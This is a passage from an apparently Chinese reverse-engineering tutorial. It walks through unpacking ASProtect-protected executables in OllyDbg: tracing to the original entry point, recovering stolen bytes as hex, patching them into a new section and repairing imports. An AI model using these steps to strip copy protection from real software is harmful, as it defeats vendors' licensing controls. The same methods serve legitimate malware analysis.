nop</span><br><span class=\"line\">0043944C    60                  pushad</span><br><span class=\"line\">0043944D    76 03               jbe short NgaMy.00439452</span><br><span class=\"line\"></span><br><span class=\"line\">8F 05 5D FE 41 00 FF 35 5D FE 41 00 89 0C 24 89 3D 91 FE 41 00 FF 35 91 FE 41 00 8F 05 81 FC 41</span><br><span class=\"line\">00 89 1D 89 FE 41 00 FF 35 89 FE 41 00 68 81 FC 41 00 5B 8B 0B 8F 05 C9 FC 41 00 8B 1D C9 FC 41</span><br><span class=\"line\">00 57 89 04 24 89 0C 24 8B 04 24</span><br><span class=\"line\"></span><br><span class=\"line\">14、hr 0012ff1c，F9</span><br><span class=\"line\"></span><br><span class=\"line\">00439D39    8F05 D5FD4100       pop dword ptr ds:[41FDD5]                       ; ntdll.KiFastSystemCallRet</span><br><span class=\"line\">00439D3F    8B0C24              mov ecx,dword ptr ss:[esp]</span><br><span class=\"line\">00439D42    8F05 4DFC4100       pop dword ptr ds:[41FC4D]</span><br><span class=\"line\">00439D48    50                  push eax</span><br><span class=\"line\">00439D49    891424              mov dword ptr ss:[esp],edx</span><br><span class=\"line\">00439D4C    8F05 BDFE4100       pop dword ptr ds:[41FEBD]</span><br><span class=\"line\">00439D52    FF35 BDFE4100       push dword ptr ds:[41FEBD]</span><br><span class=\"line\">00439D58    51                  push ecx</span><br><span class=\"line\">00439D59    B9 DDFD4100         mov ecx,NgaMy.0041FDDD</span><br><span class=\"line\">00439D5E    8939                mov dword ptr ds:[ecx],edi</span><br><span class=\"line\">00439D60    59                  pop ecx</span><br><span class=\"line\">00439D61    FF35 DDFD4100       push dword ptr ds:[41FDDD]</span><br><span class=\"line\">00439D67    C705 A9FE4100 60554&gt;mov dword ptr ds:[41FEA9],NgaMy.00405560</span><br><span class=\"line\">00439D71    FF35 A9FE4100       push dword ptr ds:[41FEA9]</span><br><span class=\"line\">00439D77    8B3C24              mov edi,dword ptr ss:[esp]</span><br><span class=\"line\">00439D7A    8F05 95FD4100       pop dword ptr ds:[41FD95]</span><br><span class=\"line\">00439D80    891D 29FD4100       mov dword ptr ds:[41FD29],ebx</span><br><span class=\"line\">00439D86    90                  nop</span><br><span class=\"line\">00439D87    90                  nop</span><br><span class=\"line\">00439D88    60                  pushad</span><br><span class=\"line\">00439D89    E8 01000000         call NgaMy.00439D8F</span><br><span class=\"line\"></span><br><span class=\"line\">8F 05 D5 FD 41 00 8B 0C 24 8F 05 4D FC 41 00 50 89 14 24 8F 05 BD FE 41 00 FF 35 BD FE 41 00 51</span><br><span class=\"line\">B9 DD FD 41 00 89 39 59 FF 35 DD FD 41 00 C7 05 A9 FE 41 00 60 55 40 00 FF 35 A9 FE 41 00 8B 3C</span><br><span class=\"line\">24 8F 05 95 FD 41 00 89 1D 29 FD 41 00</span><br><span class=\"line\"></span><br><span class=\"line\">15、hr 0012ff1c，F9</span><br><span class=\"line\"></span><br><span class=\"line\">0043A6FB    FF35 29FD4100       push dword ptr ds:[41FD29]</span><br><span class=\"line\">0043A701    8BDF                mov ebx,edi</span><br><span class=\"line\">0043A703    8BD3                mov edx,ebx</span><br><span class=\"line\">0043A705    5B                  pop ebx</span><br><span class=\"line\">0043A706    8F05 E9FE4100       pop dword ptr ds:[41FEE9]</span><br><span class=\"line\">0043A70C    8B3D E9FE4100       mov edi,dword ptr ds:[41FEE9]</span><br><span class=\"line\">0043A712    52                  push edx</span><br><span class=\"line\">0043A713    891C24              mov dword ptr ss:[esp],ebx</span><br><span class=\"line\">0043A716    68 9DFE4100         push NgaMy.0041FE9D</span><br><span class=\"line\">0043A71B    5B                  pop ebx</span><br><span class=\"line\">0043A71C    8913                mov dword ptr ds:[ebx],edx</span><br><span class=\"line\">0043A71E    8B1C24              mov ebx,dword ptr ss:[esp]</span><br><span class=\"line\">0043A721    8F05 49FE4100       pop dword ptr ds:[41FE49]</span><br><span class=\"line\">0043A727    8B1424              mov edx,dword ptr ss:[esp]</span><br><span class=\"line\">0043A72A    8F05 69FD4100       pop dword ptr ds:[41FD69]</span><br><span class=\"line\">0043A730    FF15 9DFE4100       call dword ptr ds:[41FE9D]</span><br><span class=\"line\">0043A736    8965 E8             mov dword ptr ss:[ebp-18],esp</span><br><span class=\"line\">0043A739    8925 C5FD4100       mov dword ptr ds:[41FDC5],esp</span><br><span class=\"line\">0043A73F    891D 21FD4100       mov dword ptr ds:[41FD21],ebx</span><br><span class=\"line\">0043A745    FF35 21FD4100       push dword ptr ds:[41FD21]</span><br><span class=\"line\">0043A74B    60                  pushad</span><br><span class=\"line\">0043A74C    74 03               je short NgaMy.0043A751</span><br><span class=\"line\"></span><br><span class=\"line\">FF 35 29 FD 41 00 8B DF 8B D3 5B 8F 05 E9 FE 41 00 8B 3D E9 FE 41 00 52 89 1C 24 68 9D FE 41 00</span><br><span class=\"line\">5B 89 13 8B 1C 24 8F 05 49 FE 41 00 8B 14 24 8F 05 69 FD 41 00 FF 15 9D FE 41 00 89 65 E8 89 25</span><br><span class=\"line\">C5 FD 41 00 89 1D 21 FD 41 00 FF 35 21 FD 41 00</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">16、hr 0012fe8c，F9</span><br><span class=\"line\"></span><br><span class=\"line\">0043B097    68 C5FD4100         push NgaMy.0041FDC5</span><br><span class=\"line\">0043B09C    5B                  pop ebx</span><br><span class=\"line\">0043B09D    8B33                mov esi,dword ptr ds:[ebx]</span><br><span class=\"line\">0043B09F    8B1C24              mov ebx,dword ptr ss:[esp]</span><br><span class=\"line\">0043B0A2    8F05 A9FC4100       pop dword ptr ds:[41FCA9]</span><br><span class=\"line\">0043B0A8    893E                mov dword ptr ds:[esi],edi</span><br><span class=\"line\">0043B0AA    57                  push edi</span><br><span class=\"line\">0043B0AB    8F05 F5FE4100       pop dword ptr ds:[41FEF5]</span><br><span class=\"line\">0043B0B1    FF35 F5FE4100       push dword ptr ds:[41FEF5]</span><br><span class=\"line\">0043B0B7    893424              mov dword ptr ss:[esp],esi</span><br><span class=\"line\">0043B0BA    FF15 BCA04000       call dword ptr ds:[40A0BC]                      ; NgaMy.0041F23F</span><br><span class=\"line\">0043B0C0    8B4E 10             mov ecx,dword ptr ds:[esi+10]</span><br><span class=\"line\">0043B0C3    50                  push eax</span><br><span class=\"line\">0043B0C4    B8 F9FB4100         mov eax,NgaMy.0041FBF9</span><br><span class=\"line\">0043B0C9    8910                mov dword ptr ds:[eax],edx</span><br><span class=\"line\">0043B0CB    58                  pop eax</span><br><span class=\"line\">0043B0CC    FF35 F9FB4100       push dword ptr ds:[41FBF9]</span><br><span class=\"line\">0043B0D2    56                  push esi</span><br><span class=\"line\">0043B0D3    C70424 ACDE4000     mov dword ptr ss:[esp],NgaMy.0040DEAC</span><br><span class=\"line\">0043B0DA    8B1424              mov edx,dword ptr ss:[esp]</span><br><span class=\"line\">0043B0DD    8F05 ADFD4100       pop dword ptr ds:[41FDAD]</span><br><span class=\"line\">0043B0E3    890A                mov dword ptr ds:[edx],ecx</span><br><span class=\"line\">0043B0E5    90                  nop</span><br><span class=\"line\">0043B0E6    90                  nop</span><br><span class=\"line\">0043B0E7    60                  pushad</span><br><span class=\"line\">0043B0E8    E8 01000000         call NgaMy.0043B0EE</span><br><span class=\"line\"></span><br><span class=\"line\">68 C5 FD 41 00 5B 8B 33 8B 1C 24 8F 05 A9 FC 41 00 89 3E 57 8F 05 F5 FE 41 00 FF 35 F5 FE 41 00</span><br><span class=\"line\">89 34 24 FF 15 BC A0 40 00 8B 4E 10 50 B8 F9 FB 41 00 89 10 58 FF 35 F9 FB 41 00 56 C7 04 24 AC</span><br><span class=\"line\">DE 40 00 8B 14 24 8F 05 AD FD 41 00 89 0A</span><br><span class=\"line\"></span><br><span class=\"line\">17、hr 0012fe8c，F9</span><br><span class=\"line\"></span><br><span class=\"line\">0043B9DA    8F05 29FE4100       pop dword ptr ds:[41FE29]                       ; 7FFB0000</span><br><span class=\"line\">0043B9E0    FF35 29FE4100       push dword ptr ds:[41FE29]</span><br><span class=\"line\">0043B9E6    5A                  pop edx</span><br><span class=\"line\">0043B9E7    8B46 04             mov eax,dword ptr ds:[esi+4]</span><br><span class=\"line\">0043B9EA    A3 B8DE4000         mov dword ptr ds:[40DEB8],eax</span><br><span class=\"line\">0043B9EF    8B56 08             mov edx,dword ptr ds:[esi+8]</span><br><span class=\"line\">0043B9F2    52                  push edx</span><br><span class=\"line\">0043B9F3    8F05 3DFD4100       pop dword ptr ds:[41FD3D]</span><br><span class=\"line\">0043B9F9    FF35 3DFD4100       push dword ptr ds:[41FD3D]</span><br><span class=\"line\">0043B9FF    8F05 BCDE4000       pop dword ptr ds:[40DEBC]</span><br><span class=\"line\">0043BA05    8B76 0C             mov esi,dword ptr ds:[esi+C]</span><br><span class=\"line\">0043BA08    81E6 FF7F0000       and esi,7FFF</span><br><span class=\"line\">0043BA0E    53                  push ebx</span><br><span class=\"line\">0043BA0F    BB 35FE4100         mov ebx,NgaMy.0041FE35</span><br><span class=\"line\">0043BA14    8933                mov dword ptr ds:[ebx],esi</span><br><span class=\"line\">0043BA16    5B                  pop ebx</span><br><span class=\"line\">0043BA17    FF35 35FE4100       push dword ptr ds:[41FE35]</span><br><span class=\"line\">0043BA1D    8F05 B0DE4000       pop dword ptr ds:[40DEB0]</span><br><span class=\"line\">0043BA23    90                  nop</span><br><span class=\"line\">0043BA24    90                  nop</span><br><span class=\"line\">0043BA25    60                  pushad</span><br><span class=\"line\">0043BA26    E8 01000000         call NgaMy.0043BA2C</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">8F 05 29 FE 41 00 FF 35 29 FE 41 00 5A 8B 46 04 A3 B8 DE 40 00 8B 56 08 52 8F 05 3D FD 41 00 FF</span><br><span class=\"line\">35 3D FD 41 00 8F 05 BC DE 40 00 8B 76 0C 81 E6 FF 7F 00 00 53 BB 35 FE 41 00 89 33 5B FF 35 35</span><br><span class=\"line\">FE 41 00 8F 05 B0 DE 40 00</span><br><span class=\"line\"></span><br><span class=\"line\">18、hr 0012fe90，F9</span><br><span class=\"line\"></span><br><span class=\"line\">0043BE77   /EB 01               jmp short NgaMy.0043BE7A  //F8</span><br><span class=\"line\">0043BE79   |E8 FF25BCBE         call BEFFE47D</span><br><span class=\"line\">0043BE7E    43                  inc ebx</span><br><span class=\"line\">0043BE7F    0060 E8             add byte ptr ds:[eax-18],ah</span><br><span class=\"line\">0043BE82    0000                add byte ptr ds:[eax],al</span><br><span class=\"line\">0043BE84    0000                add byte ptr ds:[eax],al</span><br><span class=\"line\">0043BE86    5E                  pop esi</span><br><span class=\"line\">0043BE87    83EE 06             sub esi,6</span><br><span class=\"line\">0043BE8A    B9 66000000         mov ecx,66</span><br><span class=\"line\">0043BE8F    29CE                sub esi,ecx</span><br><span class=\"line\">0043BE91    BA 8A261D6A         mov edx,6A1D268A</span><br><span class=\"line\">0043BE96    C1E9 02             shr ecx,2</span><br><span class=\"line\">0043BE99    83E9 02             sub ecx,2</span><br><span class=\"line\">0043BE9C    83F9 00             cmp ecx,0</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">0043BE7A  - FF25 BCBE4300       jmp dword ptr ds:[43BEBC]                       ; NgaMy.0040305C //跳到OEP</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">19、把所有的代码汇总一下：</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">89 15 F5 FD 41 00 FF 35 F5 FD 41 00 8F 05 2D FE 41 00 FF 35 2D FE 41 00 C7 04 24 60 00 00 00 56</span><br><span class=\"line\">89 0C 24 68 8D FD 41 00 59 89 19 8B 0C 24 8F 05 AD FE 41 00 FF 35 8D FD 41 00 C7 04 24 48 A2 40</span><br><span class=\"line\">00 89 05 B9 FD 41 00 FF 35 B9 FD 41 00 68 1D FD 41 00 58 89 30 8F 05 79 FC 41 00 8B 05 79 FC 41 </span><br><span class=\"line\">00 FF 35 1D FD 41 00 56 89 1C 24 C7 04 24 38 3D 40 00 8B 34 24 8F 05 A5 FE 41 00 89 05 01 FF 41 </span><br><span class=\"line\">00 FF 35 01 FF 41 00 89 1C 24 56 C7 04 24 45 FE 41 00 8F 05 31 FE 41 00 8B 1D 31 FE 41 00 89 33 </span><br><span class=\"line\">8F 05 39 FC 41 00 FF 35 39 FC 41 00 5B 8F 05 09 FE 41 00 89 1D 21 FC 41 00 FF 35 21 FC 41 00 C7 </span><br><span class=\"line\">05 19 FC 41 00 09 FE 41 00 8B 1D 19 FC 41 00 8B 33 8F 05 FD FB 41 00 8B 1D FD FB 41 00 FF 15 45 </span><br><span class=\"line\">FE 41 00 89 0D B1 FD 41 00 FF 35 B1 FD 41 00 8F 05 B5 FC 41 00 FF 35 B5 FC 41 00 56 BE FD FC 41 </span><br><span class=\"line\">00 89 3E 5E FF 35 FD FC 41 00 68 94 00 00 00 8F 05 E5 FC 41 00 FF 35 E5 FC 41 00 5F 89 3D 3D FE </span><br><span class=\"line\">41 00 FF 35 3D FE 41 00 8B 0C 24 8F 05 7D FE 41 00 8B 3C 24 8F 05 79 FD 41 00 89 35 25 FC 41 00 </span><br><span class=\"line\">FF 35 25 FC 41 00 89 0C 24 8B 3C 24 8F 05 B9 FC 41 00 8F 05 19 FE 41 00 89 05 89 FD 41 00 FF 35 </span><br><span class=\"line\">89 FD 41 00 57 BF 19 FE 41 00 8B C7 5F 8B 08 8F 05 95 FC 41 00 8B 05 95 FC 41 00 53 8F 05 5D FE </span><br><span class=\"line\">41 00 FF 35 5D FE 41 00 89 0C 24 89 3D 91 FE 41 00 FF 35 91 FE 41 00 8F 05 81 FC 41 00 89 1D 89 </span><br><span class=\"line\">FE 41 00 FF 35 89 FE 41 00 68 81 FC 41 00 5B 8B 0B 8F 05 C9 FC 41 00 8B 1D C9 FC 41 00 57 89 04 </span><br><span class=\"line\">24 89 0C 24 8B 04 24 8F 05 D5 FD 41 00 8B 0C 24 8F 05 4D FC 41 00 50 89 14 24 8F 05 BD FE 41 00 </span><br><span class=\"line\">FF 35 BD FE 41 00 51 B9 DD FD 41 00 89 39 59 FF 35 DD FD 41 00 C7 05 A9 FE 41 00 60 55 40 00 FF </span><br><span class=\"line\">35 A9 FE 41 00 8B 3C 24 8F 05 95 FD 41 00 89 1D 29 FD 41 00 FF 35 29 FD 41 00 8B DF 8B D3 5B 8F </span><br><span class=\"line\">05 E9 FE 41 00 8B 3D E9 FE 41 00 52 89 1C 24 68 9D FE 41 00 5B 89 13 8B 1C 24 8F 05 49 FE 41 00 </span><br><span class=\"line\">8B 14 24 8F 05 69 FD 41 00 FF 15 9D FE 41 00 89 65 E8 89 25 C5 FD 41 00 89 1D 21 FD 41 00 FF 35 </span><br><span class=\"line\">21 FD 41 00 68 C5 FD 41 00 5B 8B 33 8B 1C 24 8F 05 A9 FC 41 00 89 3E 57 8F 05 F5 FE 41 00 FF 35 </span><br><span class=\"line\">F5 FE 41 00 89 34 24 FF 15 BC A0 40 00 8B 4E 10 50 B8 F9 FB 41 00 89 10 58 FF 35 F9 FB 41 00 56 </span><br><span class=\"line\">C7 04 24 AC DE 40 00 8B 14 24 8F 05 AD FD 41 00 89 0A 8F 05 29 FE 41 00 FF 35 29 FE 41 00 5A 8B </span><br><span class=\"line\">46 04 A3 B8 DE 40 00 8B 56 08 52 8F 05 3D FD 41 00 FF 35 3D FD 41 00 8F 05 BC DE 40 00 8B 76 0C </span><br><span class=\"line\">81 E6 FF 7F 00 00 53 BB 35 FE 41 00 89 33 5B FF 35 35 FE 41 00 8F 05 B0 DE 40 00</span><br><span class=\"line\"></span><br><span class=\"line\">20、用工具申请一个新的区段</span><br><span class=\"line\"></span><br><span class=\"line\">记下起始的地址：0043E000</span><br><span class=\"line\"></span><br><span class=\"line\">21、OD打开创建完后的。找到0043E000，粘贴入代码，保存</span><br><span class=\"line\"></span><br><span class=\"line\">记住，后面得加跳向假OEP的代码！！</span><br><span class=\"line\"></span><br><span class=\"line\">JMP 0040305C </span><br><span class=\"line\"></span><br><span class=\"line\">22、修正入口点</span><br></pre></td></tr></table></figure>\n<h2 id=\"asprotect-1212c\"><a class=\"markdownIt-Anchor\" href=\"#asprotect-1212c\">#</a> ASProtect 1.2/1.2C</h2>\n<h3 id=\"最后一次异常-2\"><a class=\"markdownIt-Anchor\" href=\"#最后一次异常-2\">#</a> 最后一次异常</h3>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230823203357806.png\" alt=\"image-20230823203357806\"></p>\n<p>到最后一次异常之后，在下一个 ret 下段，执行到下段的地方</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230823203409091.png\" alt=\"image-20230823203409091\"></p>\n<p>在 401000 下段</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230823203440885.png\" alt=\"image-20230823203440885\"></p>\n<p>运行来到 oep</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230823203451370.png\" alt=\"image-20230823203451370\"></p>\n<h2 id=\"asprotect-123\"><a class=\"markdownIt-Anchor\" href=\"#asprotect-123\">#</a> ASProtect 1.23</h2>\n<p>忽略除内存访问以外的断点</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230823203502855.png\" alt=\"image-20230823203502855\"></p>\n<p>找到最后一次异常</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230823203515794.png\" alt=\"image-20230823203515794\"></p>\n<p>运行到 ret</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230823203526429.png\" alt=\"image-20230823203526429\"></p>\n<p>401000 下段</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230823203537369.png\" alt=\"image-20230823203537369\"></p>\n<p>到 oep</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230823203547637.png\" alt=\"image-20230823203547637\"></p>\n<p>或者运行到 retn 之后：</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230823203604011.png\" alt=\"image-20230823203604011\"></p>\n<p>hr 12ffa4   执行，到 oep</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230823203624615.png\" alt=\"image-20230823203624615\"></p>\n<h3 id=\"使用工具修复\"><a class=\"markdownIt-Anchor\" href=\"#使用工具修复\">#</a> 使用工具修复</h3>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230823203636722.png\" alt=\"image-20230823203636722\"></p>\n<p>运行，程序会在可能的 oep 暂停，这时在采用 rec 修复</p>\n<h2 id=\"asprotect-123-rc4\"><a class=\"markdownIt-Anchor\" href=\"#asprotect-123-rc4\">#</a> ASProtect 1.23 rc4</h2>\n<p>插件查壳</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230823203650794.png\" alt=\"image-20230823203650794\"></p>\n<p>版本的判断：</p>\n<p>判断版本：</p>\n<p>ASProtect 1.23 RC4 按 shift+f9 键 26 次后来到典型异常，在最近处的 retn 处设断，跳过异常，f8 步跟就会来到 foep。</p>\n<p>ASProtect 1.31 04.27 按 shift+f9 键 36 次后来到典型异常，在最近处的 retn 处设断，跳过异常，f8 步跟就会来到 foep。</p>\n<p>ASProtect 1.31 05.18 按 shift+f9 键 40 次后来到典型异常，在最近处的 retn 处设断，跳过异常，f8 步跟就会来到 foep。</p>\n<p>ASProtect 1.31 06.14 按 shift+f9 键 38 次后来到典型异常，在最近处的 retn 处设断，跳过异常，f8 步跟就会来到 foep。</p>\n<p>1、忽略除内存访问的所有异常，隐藏一下 OD，SHIFT+F9 26 次后来到最后一次异常</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230823203707216.png\" alt=\"image-20230823203707216\"></p>\n<p>00C739EC    3100                xor dword ptr ds:[eax],eax        // 断在这</p>\n<p>00C739EE    64:8F05 00000000    pop dword ptr fs:[0]</p>\n<p>00C739F5    58                  pop eax</p>\n<p>00C739F6    833D B07EC700 00    cmp dword ptr ds:[C77EB0],0</p>\n<p>00C739FD    74 14               je short 00C73A13</p>\n<p>00C739FF    6A 0C               push 0C</p>\n<p>00C73A01    B9 B07EC700         mov ecx,0C77EB0</p>\n<p>00C73A06    8D45 F8             lea eax,dword ptr ss:[ebp-8]</p>\n<p>00C73A09    BA 04000000         mov edx,4</p>\n<p>00C73A0E    E8 2DD1FFFF         call 00C70B40</p>\n<p>00C73A13    FF75 FC             push dword ptr ss:[ebp-4]</p>\n<p>00C73A16    FF75 F8             push dword ptr ss:[ebp-8]</p>\n<p>00C73A19    8B45 F4             mov eax,dword ptr ss:[ebp-C]</p>\n<p>00C73A1C    8338 00             cmp dword ptr ds:[eax],0</p>\n<p>00C73A1F    74 02               je short 00C73A23</p>\n<p>00C73A21    FF30                push dword ptr ds:[eax]</p>\n<p>00C73A23    FF75 F0             push dword ptr ss:[ebp-10]</p>\n<p>00C73A26    FF75 EC             push dword ptr ss:[ebp-14]</p>\n<p>00C73A29    C3                  retn</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230823203719637.png\" alt=\"image-20230823203719637\"></p>\n<p>2、在 RETN 处下断，SHIFT+F9，取消断点</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230823203733449.png\" alt=\"image-20230823203733449\"></p>\n<p>3、在堆栈窗口找显示程序名的下面 2 行，下 HR 12FFA4</p>\n<p>4、一直 F8，到这里</p>\n<p>00C85C47    BD 4D5CC800         mov ebp,0C85C4D</p>\n<p>00C85C4C    FF55 03             call dword ptr ss:[ebp+3]          // 到这 F7 跟</p>\n<p>00C85C4F    E8 595CC800         call 0190B8AD</p>\n<p>00C85C54    9A E969F29A 5DF3    call far F35D:9AF269E9</p>\n<p>00C85C5B    EB 02               jmp short 00C85C5F</p>\n<p>00C85C5D    CD20 1BE9EB02       vxdjump 2EBE91B</p>\n<p>00C85C63    CD20 33E8EB02       vxdjump 2EBE833</p>\n<p>00C85C69    CD20 EB010F8D       vxdcall 8D0F01EB</p>\n<p>00C85C6F    6C                  ins byte ptr es:[edi],dx</p>\n<p>00C85C70    75 37               jnz short 00C85CA9</p>\n<p>00C85C72    5D                  pop ebp</p>\n<p>00C85C73    EB 01               jmp short 00C85C76</p>\n<p>00C85C75    C7                  ???                                     ; 未知命令</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230823203745294.png\" alt=\"image-20230823203745294\"></p>\n<p>5、一直 F7 跟，找抽取代码</p>\n<p>(1)</p>\n<p>00C84F0A    55                  push ebp</p>\n<p>00C84F0B    8BEC                mov ebp,esp</p>\n<p>00C84F0D    6A FF               push -1</p>\n<p>00C84F0F    68 78E35300         push 53E378</p>\n<p>00C84F14    68 407B4F00         push 4F7B40</p>\n<p>00C84F19    64:A1 00000000      mov eax,dword ptr fs:[0]</p>\n<p>55 8B EC 6A FF 68 78 E3 53 00 68 40 7B 4F 00 64 A1 00 00 00 00</p>\n<p>(2)</p>\n<p>00C84F22    50                  push eax</p>\n<p>00C84F23    64:8925 00000000    mov dword ptr fs:[0],esp</p>\n<p>00C84F2A    83EC 58             sub esp,58</p>\n<p>50 64 89 25 00 00 00 00 83 EC 58</p>\n<p>(3)</p>\n<p>00C84F30    53                  push ebx</p>\n<p>53</p>\n<p>(4)</p>\n<p>00C84F34    56                  push esi</p>\n<p>56</p>\n<p>(5)</p>\n<p>00C84F38    57                  push edi</p>\n<p>00C84F39    8965 E8             mov dword ptr ss:[ebp-18],esp</p>\n<p>57 89 65 E8</p>\n<p>6、把代码汇总一下</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230823203758265.png\" alt=\"image-20230823203758265\"></p>\n<p>55 8B EC 6A FF 68 78 E3 53 00 68 40 7B 4F 00 64 A1 00 00 00 00 50 64 89 25 00 00 00 00 83 EC 58 53 56 57 89 65 E8</p>\n<p>7、继续 F7，来到这，就 F8</p>\n<p>00C85B74    51                  push ecx</p>\n<p>00C85B75    57                  push edi</p>\n<p>00C85B76    9C                  pushfd</p>\n<p>00C85B77    FC                  cld</p>\n<p>00C85B78    BF B55BC800         mov edi,0C85BB5</p>\n<p>00C85B7D    B9 5E140000         mov ecx,145E</p>\n<p>00C85B82    F3:AA               rep stos byte ptr es:[edi]</p>\n<p>00C85B84    9D                  popfd</p>\n<p>00C85B85    5F                  pop edi</p>\n<p>00C85B86    59                  pop ecx</p>\n<p>00C85B87    C3                  retn</p>\n<p>8、一直 F8 到这里，然后向上看</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230823203808712.png\" alt=\"image-20230823203808712\"></p>\n<p>004F27CF    FF15 9CC25200       call dword ptr ds:[52C29C]</p>\n<p>004F27D5    33D2                xor edx,edx</p>\n<p>004F27D7    8AD4                mov dl,ah</p>\n<p>004F27D9    8915 34306900       mov dword ptr ds:[693034],edx</p>\n<p>004F27DF    8BC8                mov ecx,eax</p>\n<p>004F27E1    81E1 FF000000       and ecx,0FF</p>\n<p>004F27E7    890D 30306900       mov dword ptr ds:[693030],ecx</p>\n<p>004F27ED    C1E1 08             shl ecx,8</p>\n<p>004F27F0    03CA                add ecx,edx</p>\n<p>004F27F2    890D 2C306900       mov dword ptr ds:[69302C],ecx</p>\n<p>004F27F8    C1E8 10             shr eax,10</p>\n<p>004F27FB    A3 28306900         mov dword ptr ds:[693028],eax</p>\n<p>004F2800    6A 01               push 1</p>\n<p>004F2802    E8 933B0000         call SoWorker.004F639A</p>\n<p>9、</p>\n<p>004F27A4    C3                  retn</p>\n<p>004F27A5    33C0                xor eax,eax</p>\n<p>004F27A7  ^ EB F8               jmp short SoWorker.004F27A1</p>\n<p>004F27A9    0000                add byte ptr ds:[eax],al                // 这里就是真正的 OEP 了</p>\n<p>004F27AB    0000                add byte ptr ds:[eax],al</p>\n<p>004F27AD    0000                add byte ptr ds:[eax],al</p>\n<p>004F27AF    0000                add byte ptr ds:[eax],al</p>\n<p>004F27B1    0000                add byte ptr ds:[eax],al</p>\n<p>004F27B3    0000                add byte ptr ds:[eax],al</p>\n<p>004F27B5    0000                add byte ptr ds:[eax],al</p>\n<p>004F27B7    0000                add byte ptr ds:[eax],al</p>\n<p>004F27B9    0000                add byte ptr ds:[eax],al</p>\n<p>004F27BB    0000                add byte ptr ds:[eax],al</p>\n<p>004F27BD    0000                add byte ptr ds:[eax],al</p>\n<p>004F27BF    0000                add byte ptr ds:[eax],al</p>\n<p>004F27C1    0000                add byte ptr ds:[eax],al</p>\n<p>004F27C3    0000                add byte ptr ds:[eax],al</p>\n<p>004F27C5    0000                add byte ptr ds:[eax],al</p>\n<p>004F27C7    0000                add byte ptr ds:[eax],al</p>\n<p>004F27C9    0000                add byte ptr ds:[eax],al</p>\n<p>004F27CB    0000                add byte ptr ds:[eax],al</p>\n<p>004F27CD    0000                add byte ptr ds:[eax],al</p>\n<p>004F27CF    FF15 9CC25200       call dword ptr ds:[52C29C]</p>\n<p>004F27D5    33D2                xor edx,edx</p>\n<p>10、补上代码，脱壳，修复</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230823203826479.png\" alt=\"image-20230823203826479\"></p>\n<p>先用等级 1，再用插件，都修不了直接删除。</p>\n<p>转存后的修不了用远程程序修</p>\n<p>或者使用 401000 下段也可以，但是还需要手动跟</p>\n<h2 id=\"asprotect-加壳-区段\"><a class=\"markdownIt-Anchor\" href=\"#asprotect-加壳-区段\">#</a> ASProtect 加壳 区段</h2>\n<p>如果壳中存在校验，会出现大问题</p>\n<p>1、忽略除内存访问外的所有异常，SHIFT+F9，来到最后一次异常</p>\n<p>2、来到最近的 RETN</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230823203836382.png\" alt=\"image-20230823203836382\"></p>\n<p>3、打开内存镜像，在 00401000 处下断，SHIFT+F9，到达假 OEP，记下</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230823203851980.png\" alt=\"image-20230823203851980\"></p>\n<p>004F27CF     FF15 9CC25200       call dword ptr ds:[52C29C]</p>\n<p>004F27D5     33D2                xor edx,edx</p>\n<p>004F27D7     8AD4                mov dl,ah</p>\n<p>004F27D9     8915 34306900       mov dword ptr ds:[693034],edx</p>\n<p>004F27DF     8BC8                mov ecx,eax</p>\n<p>004F27E1     81E1 FF000000       and ecx,0FF</p>\n<p>004F27E7     890D 30306900       mov dword ptr ds:[693030],ecx</p>\n<p>004F27ED     C1E1 08             shl ecx,8</p>\n<p>004F27F0     03CA                add ecx,edx</p>\n<p>004F27F2     890D 2C306900       mov dword ptr ds:[69302C],ecx</p>\n<p>004F27F8     C1E8 10             shr eax,10</p>\n<p>004F27FB     A3 28306900         mov dword ptr ds:[693028],eax</p>\n<p>004F2800     6A 01               push 1</p>\n<p>004F2802     E8 933B0000         call SoWorker.004F639A</p>\n<p>004F2807     59                  pop ecx</p>\n<p>004F2808     85C0                test eax,eax</p>\n<p>004F280A     75 08               jnz short SoWorker.004F2814</p>\n<p>4、重新来，重复上面 1 和 2 步，下 hr 